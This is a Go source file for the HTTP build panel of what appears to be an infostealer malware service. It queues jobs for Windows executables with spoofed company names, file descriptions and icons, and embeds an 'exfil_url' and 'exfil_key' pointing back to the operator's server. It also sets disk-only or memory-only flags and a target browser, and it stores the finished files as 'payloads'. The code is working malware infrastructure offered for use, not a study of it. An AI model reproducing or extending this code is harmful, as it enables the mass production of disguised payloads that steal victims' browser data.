package handler

import (
	"encoding/json"
	"io"
	"log"
	"mime"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
)

type BuildStatus string

const (
	BuildPending  BuildStatus = "pending"
	BuildRunning  BuildStatus = "running"
	BuildComplete BuildStatus = "complete"
	BuildFailed   BuildStatus = "failed"
)

// BuildFlags holds behavior flags submitted at queue time.
// The build agent receives these via /builds/claim and can use them
// to pass CLI arguments or patch the source before compiling.
type BuildFlags struct {
	DiskOnly   bool   `json:"disk_only"`
	MemoryOnly bool   `json:"memory_only"`
	Verify     bool   `json:"verify"`
	Browser    string `json:"browser,omitempty"`
}

type BuildJob struct {
	ID        string      `json:"id"`
	CreatedAt time.Time   `json:"created_at"`
	UpdatedAt time.Time   `json:"updated_at"`
	Status    BuildStatus `json:"status"`
	Preset    string      `json:"preset"`
	ExeName   string      `json:"exe_name"`
	Company   string      `json:"company,omitempty"`
	FileDesc  string      `json:"file_desc,omitempty"`
	IconExt   string      `json:"icon_ext,omitempty"`
	Error     string      `json:"error,omitempty"`
	ExfilURL  string      `json:"exfil_url"`
	ExfilKey  string      `json:"exfil_key"`
	Flags     BuildFlags  `json:"flags"`
}

func (h *Handler) buildPath(id string) string {
	return filepath.Join(h.buildsDir, id+".json")
}

func (h *Handler) saveJob(job *BuildJob) error {
	job.UpdatedAt = time.Now().UTC()
	b, _ := json.MarshalIndent(job, "", "  ")
	return os.WriteFile(h.buildPath(job.ID), b, 0640)
}

func (h *Handler) loadJob(id string) (*BuildJob, error) {
	b, err := os.ReadFile(h.buildPath(id))
	if err != nil {
		return nil, err
	}
	var job BuildJob
	return &job, json.Unmarshal(b, &job)
}

func (h *Handler) listJobs() []*BuildJob {
	entries, _ := os.ReadDir(h.buildsDir)
	var jobs []*BuildJob
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".json") {
			continue
		}
		id := strings.TrimSuffix(e.Name(), ".json")
		if job, err := h.loadJob(id); err == nil {
			jobs = append(jobs, job)
		}
	}
	sort.Slice(jobs, func(i, j int) bool {
		return jobs[i].CreatedAt.After(jobs[j].CreatedAt)
	})
	return jobs
}

// POST /builds — queue a new build job
func (h *Handler) handleBuildCreate(w http.ResponseWriter, r *http.Request) {
	if !h.requireAuth(w, r) {
		return
	}
	if err := r.ParseMultipartForm(16 << 20); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	preset  := strings.TrimSpace(r.FormValue("preset"))
	exeName := strings.TrimSpace(r.FormValue("exe_name"))
	if preset == "" || exeName == "" {
		http.Error(w, "preset and exe_name required", http.StatusBadRequest)
		return
	}

	id, _ := newID()
	job := &BuildJob{
		ID:        id,
		CreatedAt: time.Now().UTC(),
		Status:    BuildPending,
		Preset:    preset,
		ExeName:   exeName,
		Company:   strings.TrimSpace(r.FormValue("company")),
		FileDesc:  strings.TrimSpace(r.FormValue("file_desc")),
		ExfilURL:  h.baseURL,
		ExfilKey:  h.apiKey,
		Flags: BuildFlags{
			DiskOnly:   r.FormValue("disk_only") == "true",
			MemoryOnly: r.FormValue("memory_only") == "true",
			Verify:     r.FormValue("verify") == "true",
			Browser:    strings.TrimSpace(r.FormValue("browser")),
		},
	}

	if f, fh, err := r.FormFile("icon"); err == nil {
		defer f.Close()
		ext := strings.ToLower(filepath.Ext(fh.Filename))
		if ext != ".ico" && ext != ".png" {
			ext = ".ico"
		}
		iconPath := filepath.Join(h.buildsDir, id+"_icon"+ext)
		if out, err2 := os.Create(iconPath); err2 == nil {
			io.Copy(out, f)
			out.Close()
			job.IconExt = ext
		}
	}

	if err := h.saveJob(job); err != nil {
		http.Error(w, "failed to save job", http.StatusInternalServerError)
		return
	}
	log.Printf("[build] queued %s: preset=%s exe=%s", id, preset, exeName)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(job)
}

// GET /builds — list jobs as JSON
func (h *Handler) handleBuildList(w http.ResponseWriter, r *http.Request) {
	if !h.requireAuth(w, r) {
		return
	}
	jobs := h.listJobs()
	if jobs == nil {
		jobs = []*BuildJob{}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(jobs)
}

func (h *Handler) handleBuilds(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		h.handleBuildList(w, r)
	case http.MethodPost:
		h.handleBuildCreate(w, r)
	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// /builds/{id}/{action}
func (h *Handler) handleBuildItem(w http.ResponseWriter, r *http.Request) {
	if !h.requireAuth(w, r) {
		return
	}
	rest  := strings.TrimPrefix(r.URL.Path, "/builds/")
	parts := strings.SplitN(rest, "/", 2)
	id    := parts[0]
	act   := ""
	if len(parts) > 1 {
		act = parts[1]
	}
	if !reID.MatchString(id) {
		http.NotFound(w, r)
		return
	}

	switch act {
	case "icon":
		h.handleBuildIcon(w, r, id)
	case "complete":
		h.handleBuildComplete(w, r, id)
	case "fail":
		h.handleBuildFail(w, r, id)
	case "delete":
		h.handleBuildJobDelete(w, r, id)
	default:
		http.NotFound(w, r)
	}
}

func (h *Handler) handleBuildIcon(w http.ResponseWriter, r *http.Request, id string) {
	job, err := h.loadJob(id)
	if err != nil || job.IconExt == "" {
		http.NotFound(w, r)
		return
	}
	iconPath := filepath.Join(h.buildsDir, id+"_icon"+job.IconExt)
	ct := mime.TypeByExtension(job.IconExt)
	if ct == "" {
		ct = "application/octet-stream"
	}
	w.Header().Set("Content-Type", ct)
	http.ServeFile(w, r, iconPath)
}

// POST /builds/claim — build agent claims the next pending job
func (h *Handler) handleBuildClaim(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !h.requireAuth(w, r) {
		return
	}
	for _, job := range h.listJobs() {
		if job.Status == BuildPending {
			job.Status = BuildRunning
			if err := h.saveJob(job); err != nil {
				http.Error(w, "internal error", http.StatusInternalServerError)
				return
			}
			log.Printf("[build] claimed %s by agent", job.ID)
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(job)
			return
		}
	}
	w.WriteHeader(http.StatusNoContent)
}

// POST /builds/{id}/complete — agent uploads finished exe
func (h *Handler) handleBuildComplete(w http.ResponseWriter, r *http.Request, id string) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	job, err := h.loadJob(id)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	if err := r.ParseMultipartForm(256 << 20); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	f, _, err := r.FormFile("exe")
	if err != nil {
		http.Error(w, "exe file required", http.StatusBadRequest)
		return
	}
	defer f.Close()

	exePath := filepath.Join(h.payloadsDir, job.ExeName+".exe")
	out, err := os.Create(exePath)
	if err != nil {
		http.Error(w, "failed to save exe", http.StatusInternalServerError)
		return
	}
	io.Copy(out, f)
	out.Close()

	job.Status = BuildComplete
	h.saveJob(job)
	log.Printf("[build] complete %s → payloads/%s.exe", id, job.ExeName)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// POST /builds/{id}/fail — agent reports build failure
func (h *Handler) handleBuildFail(w http.ResponseWriter, r *http.Request, id string) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	job, err := h.loadJob(id)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	var body struct{ Error string `json:"error"` }
	json.NewDecoder(r.Body).Decode(&body)
	job.Status = BuildFailed
	job.Error  = body.Error
	h.saveJob(job)
	log.Printf("[build] failed %s: %s", id, body.Error)
	w.WriteHeader(http.StatusOK)
}

func (h *Handler) handleBuildJobDelete(w http.ResponseWriter, r *http.Request, id string) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	job, err := h.loadJob(id)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	os.Remove(h.buildPath(id))
	if job.IconExt != "" {
		os.Remove(filepath.Join(h.buildsDir, id+"_icon"+job.IconExt))
	}
	w.WriteHeader(http.StatusOK)
}
